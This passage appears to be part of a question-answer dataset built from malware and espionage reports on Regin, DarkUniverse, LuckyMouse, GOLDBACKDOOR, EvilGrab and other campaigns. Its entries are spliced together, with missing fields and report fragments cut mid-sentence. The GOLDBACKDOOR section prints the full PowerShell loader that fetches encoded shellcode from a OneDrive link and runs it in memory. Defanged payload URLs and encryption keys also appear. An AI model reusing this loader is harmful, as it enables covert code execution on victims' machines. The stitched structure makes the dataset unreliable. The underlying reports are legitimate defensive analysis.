the alleged compilation time and the certificate validity range, we can speculate that this binary was probably updated regularly.\nThe issuer of the certificate is an alleged Microsoft Root Authority. This name resembles a valid Microsoft issuer, but if we focus on the KeyID we find that such entry does not match any of the known Microsoft Root Authority IDs. Details about the supposed issuer of the certificate are presented below.\nKeyID=41 68 26 6a 16 60 0f 36 41 19 af 06 f9 54 4d 06\nCertificate Issuer:\nCN=Microsoft Root Authority\nOU=Microsoft Corporation\nOU=Copyright (c) 1997 Microsoft Corp\nCertificate SerialNumber=0c ea ea 19 bb bd 4f 86 4e b7 e9 47 97 cf 74 a8\nIt is also interesting to notice that, while the malware claims to be signed by Microsoft, the certification path does not show the same structure of proper Microsoft-signed binaries; specifically, there is a lack of an intermediary before Microsoft's Root Certificate Authority (CA). The certification path for the malware versus the one from a valid Microsoft-signed binary is shown in Figure 3. It is likely that the authors of this threat have used standard signing tools to create such a certificate hierarchy; they then deployed the signed binary in combination with the root certificate.\nRegin's 64-bit stage #1 component is not the first piece of malware pretending  to be signed by Microsoft. What is more interesting to consider is how this particular certificate might have been useful to keep the sample operating under the radar on a compromised machine.\nAnswer this question: How does the 64-bit version of Regin's stage #1 mimic a valid Microsoft dynamic link library, and why is this technique effective?",
    "output": "The 64-bit version of Regin's stage #1 mimics a valid Microsoft dynamic link library by using a name that is reminiscent of other winsock-related system libraries, such as wshnetc.dll. It also includes a description that matches typical system files, such as 'Winsock 2 Helper DLL (TL/IPv4)'. Additionally, the DLL exports 16 functions that are identical to those exported by Windows' own wshtcpip.dll, forwarding calls to the actual system library. This technique is effective because it can deceive even technically astute victims into believing that the malware is a legitimate system component, especially if it is located in the system folder.",

    "output": "The Virtual File Systems (VFSes) in the Regin platform store the most interesting code and have a structure similar to a real disk file system like FAT. Each VFS begins with a header that provides basic information needed to operate the file system, followed by a bitmap of used/free sectors and a file table. Files are described by file table entries, and each sector starts with a 32-bit integer indicating the offset of the next sector of the file. The file entries are encrypted using the RC5 algorithm, and many records are also compressed using the nrv2e algorithm from the UCL library. The UCL library is an open-source implementation of the NRV compression algorithm, chosen for its compactness and minimal memory requirements. Each VFS is encrypted with a 16-byte key, which can vary from victim to victim. Most files, however, are encrypted with the same key, {73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}, stored in the dispatcher module or VMEM.sys kernel core.",

The use of law enforcement related themes across May and June 2021, as well as in February 2022, suggests that the threat group favors this social engineering theme in the absence of a trending topic or current event.\nBoth of the delivery emails had the same attachment, specifically \u0417\u0430\u044f\u0432\u0430 \u21164872823-(20).cpl (SHA256: f4a56c86e2903d509ede20609182fbe001b3a3ca05f8c23c597189935d4f71b8), which is a Windows Control Panel File that acts as an initial downloader to download and execute a payload from:\n32689657[.]xyz/putty5482.exe\nThe Control Panel File saves the downloaded executable to %PUBLIC%\\puttys.exe and runs it using the WinExec function.

The 000.cpl is a DLL whose functional code exists within the exported function CPlApplet. The functional code uses several consecutive jumps in an attempt to make code analysis more difficult. Despite these jumps, the functional code starts with a decryption stub, which will XOR each QWORD in the ciphertext using a key that starts as 0x29050D91. However, in each iteration of the decryption loop, the key is modified by multiplying it by 0x749507B5 and adding 0x29050D91.\nOnce the decryption stub has finished, the code jumps to the decrypted code, which is a shellcode-based downloader that carries out the following activity:\n1.

The actors sent the email to an address publicly displayed on the embassy's website with the subject RE: CV. The email had a Word document attached to it with a filename structured as <first name>_<last name>_CV.doc, of which the name was a well-known journalist in Ukraine. Figure 29 shows the contents of the attached document as it would display in a native Ukrainian installation of Windows.\nThe content of the document is meant to resemble a resume of the journalist. However, the garbled text suggests an encoding issue that the Ukrainian version of Windows could not display. The image is a stock photo available at several websites [][][(<http://www.apimages.com/metadata/MSIndex/One-female-specialists-staying-on-work-office/243123332/517>)3], which does not appear to be a picture of the actual journalist. The garbled text is likely intentional as an attempt to trick the user into clicking the \"Enable Editing\" button, which would ultimately run the macro embedded in the document. The macro that will run if the user clicks the \"Enable Editing\" button, seen in Figure 30, creates a batch script called meancell.bat that executes a PowerShell command that will use the Start-BitsTransfer cmdlet to download a payload from hxxp://1833[.]site/kpd1974.exe.

We named this payload WinorDLL64 based on its filename WinorDLL64.dll. Wslink, which had the filename WinorLoaderDLL64.dll, is a loader for Windows binaries that, unlike other such loaders, runs as a server and executes received modules in memory. As the wording suggests, a loader serves as a tool to load a payload, or the actual malware, onto the already compromised system. The initial Wslink compromise vector has not been identified.\nThe initially unknown Wslink payload was uploaded to VirusTotal from South Korea shortly after the publication of our blogpost, and hit one of our YARA rules based on Wslink's unique name WinorDLL64. Regarding Wslink, ESET telemetry has seen only a few detections \u2013 in Central Europe, North America, and the Middle East.\nThe WinorDLL64 payload serves as a backdoor that most notably acquires extensive system information, provides means for file manipulation, such as exfiltrating, overwriting, and removing files, and executes additional commands. Interestingly, it communicates over a connection that was already established by the Wslink loader.\nIn 2021, we did not find any data that would suggest Wslink is a tool from a known threat actor. However, after an extensive analysis of the payload, we have attributed WinorDLL64 to the Lazarus APT group with low confidence based on the targeted region and an overlap in both behavior and code with known Lazarus samples.\nActive since at least 2009, this infamous North-Korea aligned group is responsible for high-profile incidents such as both the (<https://www.welivesecurity.com/2014/12/08/sony-pictures-hacking-traced-thai-hotel-north-korea-denies-involvement/>)Sony Pictures Entertainment hack and tens-of-millions-of-dollar (<https://www.welivesecurity.com/2016/03/15/bangladesh-central-bank-boss-quits-100m-cyberheist/>)cyberheists in 2016, the (<https://www.welivesecurity.com/2017/05/15/wannacryptor-key-questions-answered/>)WannaCryptor (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against (<https://www.welivesecurity.com/2020/11/16/lazarus-supply-chain-attack-south-korea/>)South Korean public and critical infrastructure since at least 2011.

A letter was prepared separately for each victim to grab their attention and prompt them to open an attached malicious Microsoft Office document.\nEach malware sample was compiled immediately before being sent and included the latest available version of the malware executable. Since the framework evolved from 2009 to 2017, the last releases are totally different from the first ones, so the current report details only the latest available version of the malware used until 2017.\nThe executable file embedded in the documents extracts two malicious files from itself, updater.mod and glue30.dll, and saves them in the working directory of the malware \u2013 %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Reorder.\nAfter that, it copies the legitimate rundll32.exe executable into the same directory and uses it to run the updater.mod library.\nMedium Headline: The updater.mod module\nThis module is implemented as a dynamic-link library with only one exported function, called callme@16. This module is responsible for such tasks as providing communication with the C2 server, providing the malware integrity and persistence mechanism and managing other malware modules.\nThe persistence mechanism is provided by a link file, which is placed by updater.mod into the startup folder, ensuring malware execution after a reboot. If the link file becomes corrupted, the updater.mod module restores it.\nMedium Headline: Communication with C2\nIn this campaign the C2 servers were mostly based on cloud storage at mydrive.ch. For every victim, the operators created a new account there and uploaded additional malware modules and a configuration file with commands to execute it. Once executed, the updater.mod module connected to the C2 and performed the following actions:\ndownloaded the command file to the working directory;\nuploaded files collected and prepared by additional malicious modules (if any) to the C2. These files were located in a directory called 'queue' or 'ntfsrecover' in the working directory. Files in this directory could have one of two extensions: .d or .upd depending on whether they had already been uploaded to the server or not.\ndownloaded additional malware modules:\ndfrgntfs5.sqt \u2013 a module for executing commands from the C2;\nmsvcrt58.sqt \u2013 a module for stealing mail credentials and emails;\nzl4vq.sqt \u2013 legitimate zlib library used by dfrgntfs5;\n%victim_ID%.upe \u2013 optional plug-in for dfrgntfs5. Unfortunately, we were unable to obtain this file.\nAll malware modules are encrypted with a custom algorithm:\nThe credentials for the C2 account are stored in the configuration that is placed in the registry, but the updater.mod module also stores a copy as an encrypted string in the executable file. Also, the configuration specifies how often updater.mod polls the C2, supporting both an active mode and a partly active mode.\nMedium Headline: Modules glue30.dll and msvcrt58.sqt\nThe glue30.dll malware module provides keylogging functionality. The updater.mod module uses the Win API function SetWindowsHookExW to install hooks for the keyboard and to inject glue30.dll into processes that get keyboard input. After that, glue30.dll loads and begins intercepting input in the context of each hooked process.\nThe msvcrt58.sqt module intercepts unencrypted POP3 traffic to collect email conversations and victims' credentials. This module looks for traffic from the following processes:\noutlook.exe;\nwinmail.exe;\nmsimn.exe;\nnlnotes.exe;\neudora.exe;\nthunderbird.exe;\nthunde~1.exe;\nmsmsgs.exe;\nmsnmsgr.exe.\nThe malware parses intercepted POP3 traffic and sends the result to the main module (updater.mod) for uploading to the C2. This is done by hooking the following network-related Win API functions:\nws2_32.connect;\nws2_32.send;\nws2_32.recv;\nws2_32.WSARecv;\nws2_32.closesocket.\nBig Headline: Conclusions\nDarkUniverse is an interesting example of a full cyber-espionage framework used for at least eight years. The malware contains all the necessary modules for collecting all kinds of information about the user and the infected system and appears to be fully developed from scratch. Due to unique code overlaps, we assume with medium confidence that DarkUniverse's creators were connected with the ItaDuke set of activities. The attackers were resourceful and kept updating their malware during the full lifecycle of their operations, so the observed samples from 2017 are totally different from the initial samples\nfrom 2009. The suspension of its operations may be related to the publishing of the 'Lost in Translation' leak, or the attackers may simply have decided to switch to more modern approaches and start using more widely available artefacts for their operations.\nAnswer this question: How did the glue30.dll module in the DarkUniverse APT framework function to capture keystrokes? Describe the technical method used to achieve this and the role of the updater.mod module in this process.",
    "output": "The glue30.dll module in the DarkUniverse APT framework provided keylogging functionality. The updater.mod module used the Win API function SetWindowsHookExW to install hooks for the keyboard and injected glue30.dll into processes that received keyboard input. Once injected, glue30.dll began intercepting input in the context of each hooked process. This allowed the malware to capture keystrokes and send the captured data back to the C2 server via the updater.mod module.",

    "instruction": "Big Headline: Who's behind it?\nDue to tools and tactics in use we attribute the campaign to LuckyMouse Chinese-speaking actor (also known as EmissaryPanda and APT27). Also the C2 domain update.iaacstudio[.]com was previously used in their campaigns. The tools found in this campaign, such as the HyperBro Trojan, are regularly used by a variety of Chinese-speaking actors. Regarding Metasploit's shikata_ga_nai encoder \u2013 although it's available for everyone and couldn't be the basis for attribution, we know this encoder has been used by LuckyMouse previously.\nGovernment entities, including the Central Asian ones also were a target for this actor before. Due to LuckyMouse's ongoing waterholing of government websites and the corresponding dates, we suspect that one of the aims of this campaign is to access web pages via the data center and inject JavaScripts into them.\nBig Headline: How did the malware spread?\nThe initial infection vector used in the attack against the data center is unclear. Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can\u00b4t prove they were related to this particular attack. It's possible the actor used a waterhole to infect data center employees.\nThe main C2 used in this campaign is bbs.sonypsps[.]com, which resolved to IP-address, that belongs to the Ukrainian ISP network, held by a Mikrotik router using firmware version 6.34.4 (from March 2016) with SMBv1 on board. We suspect this router was hacked as part of the campaign in order to process the malware's HTTP requests. The Sonypsps[.]com domain was last updated using GoDaddy on 2017-05-05 until 2019-03-13.\nIn March 2017, Wikileaks published details about an exploit affecting Mikrotik called ChimayRed. According to the documentation, however, it doesn't work for firmware versions higher than 6.30. This router uses version 6.34.\nThere were traces of HyperBro in the infected data center from mid-November 2017. Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites. These events suggest that the data center infected with HyperBro and the waterholing campaign are connected.\nBig Headline: What did the malware do in the data center?\nThe initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db). As a result of all these steps, the last-stage Trojan is injected into svchost.exe's process memory.\nThe launcher module, obfuscated with the notorious Metasploit's shikata_ga_nai encoder, is the same for all the droppers. The resulting deobfuscated code performs typical side loading: it patches pcAnywhere's image in memory at its entry point. The patched code jumps back to the decryptor's second shikata_ga_nai iteration, but this time as part of the whitelisted application.\nThis Metasploit's encoder obfuscates the last part of the launcher's code, which in turn resolves the necessary API and maps thumb.db into the same process's (pcAnywhere) memory. The first instructions in the mapped thumb.db are for a new shikata_ga_nai iteration. The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory.\nBig Headline: Conclusions\nLuckyMouse appears to have been very active recently. The TTPs for this campaign are quite common for Chinese-speaking actors, where they typically provide new solid wrappers (launcher and decompressor protected with shikata_ga_nai in this case) around their RATs (HyperBro).\nThe most unusual and interesting point here is the target. A national data center is a valuable source of data that can also be abused to compromise official websites. Another interesting point is the Mikrotik router, which we believe was hacked specifically for the campaign. The reasons for this are not very clear: typically, Chinese-speaking actors don't bother disguising their campaigns. Maybe these are the first steps in a new stealthier approach.\n\nQ: Why was the LuckyMouse APT group attributed to the campaign targeting the national data center in Central Asia? Discuss the specific tools, tactics, and indicators that led to this attribution.",
    "output": "A: The LuckyMouse APT group was attributed to the campaign due to several factors. Firstly, the tools and tactics used in the campaign, such as the HyperBro Trojan, are commonly associated with various Chinese-speaking actors, including LuckyMouse. Additionally, the C2 domain update.iaacstudio[.]com had been previously used in LuckyMouse campaigns. Furthermore, the use of Metasploit's shikata_ga_nai encoder, while not unique to LuckyMouse, has been observed in their previous operations. Government entities, including those in Central Asia, have also been targeted by LuckyMouse before, further supporting the attribution.",

    "instruction": "Small Headline: Kang Min-chol Edits 2.zip\n-\n-\n-\n-\nThe deployment chain for GOLDBACKDOOR in this incident was predicated on a user downloading a ZIP file from https[:]//main[.]dailynk[.]us/regex?id=oTks2&file=Kang Min-chol Edits 2.zip and executing a compressed Windows shortcut. The domain dailynk[.]us was likely chosen to impersonate NK News (dailynk[.]com), previously used by APT37 as a strategic web compromise DSWCE using CVE20201380 and CVE202126411. At the time of initial analysis, the domain\nmail[.]dailynk[.]us had stopped resolving; however, from historic DNS resolutions, we were able to identify 142.93.201[.]77 as the last address this domain resolved and were able to retrieve the ZIP file.\nThis ZIP file DSHA256 hash:\n9eddd99db6f5a7791f7e446792f04b301d29f6b0596920e8b39647cc7585185d) was named Kang Min-chol Edits 2.zip and contains a single Windows shortcut file. Timestamps in the ZIP file show that the contained file was added on 17 March 2022 at 16\u202251 UTC.\nSmall Headline: Kang Min-chol Edits 2.lnk\nContained within the initial ZIP archive was a 282.7 MB Windows shortcut file DLNKE named Kang Min-chol Edits 2.lnk DSHA256 hash:\n120ca851663ef0ebef585d716c9e2ba67bd4870865160fec3b853156be1159c5). The attackers masqueraded this shortcut as a document, using both the icon for Microsoft Word and adding comments similar to a Word document. Additionally, this LNK file was padded with 0x90 (or NOP/No Operation) bytes to artificially increase the size of this file, potentially as a means of preventing upload to detection services or malware repositories.\nWhen this LNK file is executed, it executes a PowerShell script that writes and opens a decoy document before starting the deployment process of GOLDBACKDOOR. A formatted version the PowerShell command and executed script are shown below:\n%windir%\\SysWOW64\\cmd.exe /c powershell -windowstyle hidden\n$dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {\n$dirPath = '%temp%'\n}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk ^| where-object {\n$_.length -eq 0x0010D98A06\n} ^| Select-Object -ExpandProperty FullName;\n$pdfFile = gc $lnkpath -Encoding Byte -TotalCount 00547552 -ReadCount 00547552;\n$pdfPath = '%temp%\\Kang Min-chol Edits 2.doc'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 009440)) -Encoding Byte; ^& $pdfPath;\n$won11 =\"$temple=\"\"\"5B4E...(Removed for readability)...293B\"\"\";\n$martin=\"\"\"\"\"\"; for($i=0;$i -le $temple.Length-2;$i=$i+2){\n$Sorre=$temple[$i]+$temple[$i+1];\n$martin= $martin+[char]([convert]::toint16($Sorre,16));\n};\nInvoke-Command -ScriptBlock ([Scriptblock]::Create($martin));\";\nInvoke-Command -ScriptBlock ([Scriptblock]::Create($won11));\nThe decoy document DSHA256 hash: 94ca32c0a3002574d7ea1bef094146a9d3b2ad0018b3e3d3f4ffca8689b89e5a) dropped by this LNK file is embedded at file offset 0x24E0 D9440E and written to %temp%\\Kang Min-chol Edits 2.doc, before being opened. The following screenshot shows the opened document after a user runs the shortcut. To a user executing the LNK file, believing it was a legitimate document, the only indication that something suspicious was underway may have been a short delay while the document was extracted and written to disk.\nScreenshot of decoy document\nAfter deploying the decoy document, the PowerShell script decodes a second PowerShell script, hex-encoded in the $temple variable, which it executes using Invoke-Command. A decoded and formatted version of the second PowerShell script is shown below:\n[Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType], 3072);\n$aa='[DllImport(\"kernel32.dll\")]public static extern IntPtr GlobalAlloc(uint b,uint c);'; $b=Add-Type -MemberDefinition $aa -Name \"AAA\" -PassThru;\n$abab = '[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);';\n$aab=Add-Type -MemberDefinition $abab -Name \"AAB\" -PassThru;\n$c = New-Object System.Net.WebClient;\n$d=\"hxxps://api[.]onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBcjl6ZnJ3eFdXRW9hczVYaV c5TWUxNGlhQnM_ZT0wZVdDcTc/root/content\";\n$bb='[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);';\n$ccc=Add-Type -MemberDefinition $bb -Name \"BBB\" -PassThru;\n$ddd='[DllImport(\"kernel32.dll\")]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);';\n$fff=Add-Type -MemberDefinition $ddd -Name \"DDD\" -PassThru;\n$e=112;\ndo { try {\n$c.Headers[\"user-agent\"] = \"connnecting...\";\n$xmpw4=$c.DownloadData($d);\n$x0 = $b::GlobalAlloc(0x0040, $xmpw4.Length+0x100);\n$old = 0;\n$aab::VirtualProtect($x0, $xmpw4.Length+0x100, 0x40, [ref]$old); for ($h = 1; $h -lt $xmpw4.Length; $h++) {\n[System.Runtime.InteropServices.Marshal]::WriteByte($x0, $h-1, ($xmpw4[$h] -bxor\n$xmpw4[0]) );\n}; try{throw 1;}\ncatch{\n$handle=$ccc::CreateThread(0,0,$x0,0,0,0);\n$fff::WaitForSingleObject($handle, 500*1000);\n}; $e=222; }\ncatch{\nsleep 11; $e=112;\n} while($e -eq 112);\nWhen executed, this second PowerShell script will download and execute a shellcode payload DXOR encoded using the first-byte as a key) stored on Microsoft OneDrive. When manually downloaded during analysis, this payload was named Fantasy.\nSmall Headline: Fantasy injector\nFantasy is the first of a two-part process for deploying GOLDBACKDOOR. Both parts are written in position-independent code (shellcode) containing an embedded payload, and use process injection to deploy GOLDBACKDOOR.\nShellcode typically resolves external Windows API calls at runtime. Fantasy uses a common technique for this, which involves parsing the InLoadOrderModuleList structure of the Process Environment Block DPEBE of the parent process to generate a list of libraries already loaded. When Fantasy needs to use one of these API calls, it passes a hashed value of the intended API call to a dedicated function that returns the corresponding address. This function hashes loaded Windows API names and libraries until it matches the requested hash. A pseudocode implementation of this hashing is shown below:\nUpon execution, Fantasy parses files under %WINDIR%\\System32 until one is found that ends in .exe that Fantasy has read access. The full path to the identified executable file is written to %localappdata%\\\\log_gold.txt, possibly for debugging purposes, before being started in a suspended state using CreateProcessA and passing the CREATE_SUSPENDED flag.\nOnce a suspended process has been created, Fantasy will decode a shellcode payload, which will be injected into the newly created process. The injected payload is stored at offset 0x672 and obfuscated using a single byte eXclusive OR DXORE cipher. The size and XOR key for this payload are structured\nusing a distinctive format to avoid statically defining values in the shellcode. A representation of this structure is shown below:\nAfter this payload is decoded, Fantasy uses a standard process involving VirtualAllocEx, WriteProcessMemory, and RtlCreateUserThread to spawn a thread under the previously created process for execution of this payload.\nSmall Headline: Final dropper\nThe shellcode payload, running as a thread in a process created by Fantasy, is responsible for the final deployment of GOLDBACKDOOR. Fundamentally, this component is close in design and functionality to its parent shellcode loader; it uses the same method for API resolution, payload structure, and writes a log file to %localappdata%\\\\log_gold2.txt.\nThe payload delivered by this stage is a Windows Portable Executable DPEE file for GOLDBACKDOOR. As with the previous shellcode payload, the first byte is used as an XOR key and the proceeding DWORD defines the size of the encoded payload. After decoding, the PE header of the payload is parsed for its respective EntryPoint1 , which is then called to begin the execution of GOLDBACKDOOR.\n\nAnswer this question based on the above context: How does the LNK file in the GOLDBACKDOOR deployment chain masquerade itself as a legitimate document, and what techniques are used to prevent its detection?",
    "output": "The LNK file masquerades as a legitimate document by using the icon for Microsoft Word and adding comments similar to those found in a Word document. Additionally, the file is padded with NOP (No Operation) bytes to artificially increase its size, making it difficult to upload to detection services or malware repositories. This padding helps the file evade automated analysis systems that might flag smaller, suspicious files.",

    "instruction": "Context: Big Headline: Tencent QQ Memory Reading\nIf the active window is Tencent QQ (specifically, QQ2009 through QQ2012), EvilGrab will attempt to steal information by directly reading the process's memory and checking if the class name of the focused window is not named \"EDIT.\"\nThe contents of the process's memory are then saved onto the system's hard drive as %UserProfile%\\users.bin. It is then sent back to the backdoor's C&C server. The file on the hard drive is encrypted; specifically, the data is XORed with the key 0x66.\nBig Headline: Backdoor Activity\nTo start its connection to its C&C server, the backdoor component will first send 5-bytes (\\x01\\x00\\x00\\x00\\x33). The C&C will reply if it accepts the connection. The backdoor then replies with a beacon message, the contents of which are as follows:\nEither backdoor identifier 1 or backdoor identifier 2 acts as the campaign code or marker for EvilGrab campaigns, which is recognizable by the C&C server and/or attacker. Some of the identifiers we saw in backdoor identifier 1 are:\n\u2022 006\n\u2022 007\n\u2022 0401\n\u2022 072002\n\u2022 3k-Ja-0606\n\u2022 3k-jp01\n\u2022 4k-lyt25\n\u2022 88j\n\u2022 e-0924\n\u2022 LJ0626\n\u2022 RB0318\nSome of the identifiers seen in our accumulated data in backdoor identifier 2 are as follows:\n\u2022 V2010-v16\n\u2022 V2010-v24\nWe noted a correlation between the MZ/PE headers of variants and the strings in backdoor identifier 2. Variants with a V2010-v24 identifier have a proper MZ/PE header; variants with a V2010-v16 header have portions of their header overwritten with JPEG strings. These variants require a loader component to load them into memory in order to be executed.\nBelow is a sample packet sent at the beginning of the connection:\nCode snapshot\nEvilGrab variants possess a wide variety of possible backdoor commands.

EvilGrab steals internal user names and passwords as well as logs keystrokes. Credentials stolen this way can be used to move within the confines of the organization's network.\nEvilGrab possesses a wide variety of information theft capabilities. It can grab audio and video files directly from devices attached on the system (i.e. microphone and camera). In addition, EvilGrab can upload files from the affected system to remote servers. EvilGrab possesses a full range of capabilities that is expected in malware used in targeted attacks against organizations.\nBig Headline: Trend Micro Recommendations\nTargeted attacks pose a challenge to traditional signature-based security solutions. To deal with these type of threats, employ solutions that include network monitoring to detect and analyze incoming threats, as well as any outgoing communication with attacking parties.\nProducts like Trend Micro\u2122 Deep Discovery\u2122 are capable of mitigating the risks from these threats. One component of Deep Discovery, the Deep Discovery Inspector, provides network threat detection, custom sandboxing, and real-time analysis and reporting.\nThe second component, Deep Discovery Advisor, provides sandbox analysis of known and unknown threats that augments the capabilities of existing products like endpoint solution and email/web gateways. It also provides visibility to network-wide security events.\nThe capabilities provided by solutions like Deep Discovery are necessary to provide a unified, comprehensive view of the threats an organization faces. This information can then be used by an organization to create appropriate and proportional responses to properly protect an organization's network.\nBig Headline: References\n1 Sancho, David; Dela Torre, Jessa; Bakuei, Matsukawa; Villeneuve, Nart; and McArdle, Robert.

    "instruction": "Write an answer to the following question: How does the Scarlet Mimic APT's shift from malware to phishing campaigns reflect its adaptability in targeting the Tibetan community?",
    "output": "Phishing is a type of social engineering attack that involves tricking users into revealing sensitive information, such as login credentials. In the case of the Scarlet Mimic APT, its shift from malware to phishing campaigns targeting the Tibetan community demonstrates its adaptability in response to changing security behaviors and increasing detection rates by antivirus products. The APT's use of phishing campaigns, which involve sending emails with malicious links or attachments, allows it to exploit the trust of its targets in popular email and social network services, such as Google. By leveraging the widespread use of these services within the Tibetan community, the APT aims to gain access to sensitive information that could compromise the safety and security of individuals in Tibet. Furthermore, the APT's reuse of existing command and control infrastructure for its phishing campaigns suggests a level of resourcefulness and flexibility in its tactics. Overall, the Scarlet Mimic APT's shift to phishing campaigns highlights the importance of continued vigilance and awareness among targeted communities, as well as the need for robust security measures, such as two-factor authentication and cautious email practices.",

For instance, in one of their (<http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/>)Unit 42 blog posts Palo Alto Networks provides some detailed reversing and analysis on other malware that they attributed to COZY BEAR named \"SeaDuke.\" The Fidelis Reverse Engineering team noted that in the samples of \"SeaDaddy,\" that were provided to us from the DNC incident, there were nearly identical code obfuscation techniques and methods. In fact, once decompiled, the two programs were very similar in form and function. They both used identical persistence methods (Powershell, a RUN registry key, and a .lnk file stored in the Startup directory).\nb. The SeaDaddy sample had a self-delete function named \"seppuku\" which was identified in a previous SeaDuke sample described by (<http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory>)Symantec and attributed to the COZY BEAR APT group. It's worth noting that seppuku is a Japanese word for harakiri or self-disembowelment.\nc.

This is a very specific modus operandi less sophisticated actors do not employ.\nSo what does this mean? Who is responsible for the DNC hack? Based on our comparative analysis we agree with CrowdStrike and believe that the COZY BEAR and FANCY BEAR APT groups were involved in successful intrusions at the DNC. The malware samples contain data and programing elements that are similar to malware that we have encountered in past incident response investigations and are linked to similar threat actors.\nIn addition to CrowdStrike, several other security firms have analyzed and published findings on malware samples that were similar and in some cases nearly identical to those used in the DNC incident. Many of these firms attributed the malware to Russian APT groups.\nThat brings us to the issue about Guccifer 2.0's claim of responsibility for the attack. Several researchers have raised questions about the allegedly stolen documents posted by Guccifer 2.0. (<http://arstechnica.com/security/2016/06/guccifer-leak-of-dnc-trump-research-has-a-russians-fingerprints-on-it/>)Ars Technica reported similar findings that align with some of our initial analysis on this topic.\nWhile we believe this settles the question of \"who was responsible for the DNC attack,\" we will continue to watch, along with the rest of the security community, the new twists and turns this story takes as the U.S. presidential elections swings into full gear.\n- Michael Buratowski, senior vice president, Security Consulting Services\n\nWhat specific features in the X-Tunnel sample associated with FANCY BEAR did the Fidelis analysis confirm, and how did these features align with previous reports from Microsoft and Netzpolitik?",

    "instruction": "Answer based on context:\n\nMedium Headline: STEALING THE OPPOSITION'S PLANS\nThe threat group amassed a significant amount of data, from Skype account databases to planning documents and spreadsheets to photos. The victims created the majority of the data from May 2013 to December 2013. Some of the stolen Skype databases included chat history going back to 2012 and activity as recent as January 2014. The threat\ngroup chose what it stole carefully, there were only a few instances where the group downloaded movies, empty files, end user licensing agreements, baby pictures, school papers, and other seemingly extraneous material. We have summarized the major types of information contained in the stolen data in the table below:\nVery Small Headline: MILITARY INFORMATION\nThe threat group took a range of military-related information, and seemed to pay special attention to files that contained lists of names. We found dozens of lists identifying hundreds of fighters serving in armed opposition groups. Some lists included names and birthdates, while others noted the weapons and serial numbers each man carried, their blood types, and their phone numbers.\nThe threat group also stole lists of officers in Assad's forces, and pictures of suspected Hezbollah operatives captured or killed inside Syria, as well as pictures of fighting-age men with weapons and in irregular uniforms posing for the camera or exploring battle damaged towns.\nSometimes, the threat group would take whole sets of files pertaining to upcoming large-scale military operations. These included correspondence, rosters, annotated satellite images, battle maps, orders of battle, geographic coordinates for attacks, and lists of weapons from a range of fighting groups.\nWe identified records of the number of Kalashnikovs and light machine guns taken, materials found, and casualties suffered during operations. One such report describes capturing a warehouse filled with chemical weapons protective equipment, suits, cleaning products, and possibly antidotes. The report did not mention whether any chemical agents were found.\nThe threat group also took Skype chat logs, in which mundane conversations often transitioned into sensitive communications about strategy, logistical issues, and supply routes, and frank assessments of recent engagements with the enemy. In one chat, opposition members discuss the movement of a shipment of 9M113 TOW missiles and launchers, and agree upon a time and location to handover the weapons.\nSmall Headline: MAP OF SYRIAN OPPOSITION BATTLE PLANS\nOpposition battle plans were stolen that included information about the emplacements of anti-government forces. The stolen plans are high-value artifacts that may have provided actionable military intelligence to the recipients. This redacted map shows part of an attack plan against Assad's forces military encampment (red rectangle).\nThe threat group stole data such as personal updates, lists of casualties, and documents discussing investigations into the use of chemical weapons.\nVery Small Headline: REFUGEE PERSONAL INFORMATION\nWe also found that the threat actors had stolen information pertaining to Syrian refugees in Turkey and elsewhere. Refugees must provide a range of documentation to the relevant authorities in order to receive benefits from the host country. The threat group had obtained filled-out applications for assistance and education, and even the scanned ID cards of refugees and their CVs. We found photos depicting Syrian families in Turkish refugee camps, and children next to cars in temporary refugee housing.\nMedium Headline: SERVING VARIED ROLES IN THE OPPOSITION\nWe analyzed the stolen Skype databases to find out what roles the victims served in the opposition and to understand the connections between the victims. First, we scanned the contents of the victims' chat logs to identify other victims. We then surmised that the number of shared contacts between\nthe Skype accounts illustrated the relationships between victims. We were also able to ascertain more about the victims' roles and work from the chat logs. For further explanation, see Appendix B: Social Media Analysis of Victim Skype Databases.\nProfiled below are four sample victims:\nVery Small Headline: VICTIMS LOCATED IN SYRIA AND BEYOND\nAmong the victims were individuals who appear to be linked to the Free Syrian Army (a set of groups united by their opposition to Assad), Islamist fighting groups, and individuals with no clear group affiliation. Some of the victims appear to operate within opposition-controlled areas of Syria, while others are more likely located within the broader diaspora networks in Lebanon, Jordan, and the Persian Gulf.\nMedium Headline: CHATTING WITH FEMALE AVATARS\nThe threat group created several Skype accounts with female avatars to target (male) individuals in the Syrian opposition. The female avatars, which had generic but country-appropriate names and profile images, would develop a rapport with the victim before sending a malicious file. The female avatars approached their targets with a series of personal questions that appeared to be part of a script\nThe first two questions would generally be:\nWe believe the first question about the victim's Skype access determined whether the victim received malware designed to compromise a computer or a mobile device.2 The avatar would request a photo of the target, then send a \"personal photo\" of a woman in return. The avatar's \"photo\" was actually an executable file (a self-extracting RAR archive) renamed with the .pif file extension.3 When the victim \"opened\" the photo, a woman's picture was displayed while the SFXRAR executed and ultimately installed the DarkComet RAT in the background. From this point on, the victim's computer was under the threat group's control.\nThe other personal questions presumably helped the threat actors systematically collect information from each of their targets. The threat actors would sometimes reinitiate chat sessions with victims after a period of inactivity to collect additional details. For example, we observed a female avatar engage one victim in lengthy chats about Syrian refugees in Beirut. After successfully compromising the target, the conversations stopped. Later \"she\" briefly re-emerged 